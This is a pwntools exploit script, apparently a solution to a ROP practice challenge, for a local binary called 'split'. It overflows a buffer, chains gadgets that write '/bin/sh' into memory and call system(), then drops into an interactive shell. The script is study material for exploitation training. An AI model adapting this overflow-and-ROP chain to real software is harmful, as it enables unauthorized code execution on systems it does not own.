#!/usr/bin/env python
from pwn import *

ovf = b'A'*40
rop1 = p64(0x400890)
r14 = p64(0x601800)
r15 = b'/bin/sh\x00'
rop2 = p64(0x400820)
rop3 = p64(0x400893)
bin_sh = r14
system_plt = p64(0x4005e0)

payload = ovf + rop1 + r14 + r15 + rop2 + rop3 + bin_sh + system_plt

e = process('./split')
print(e.recv())

e.sendline(payload)
e.interactive()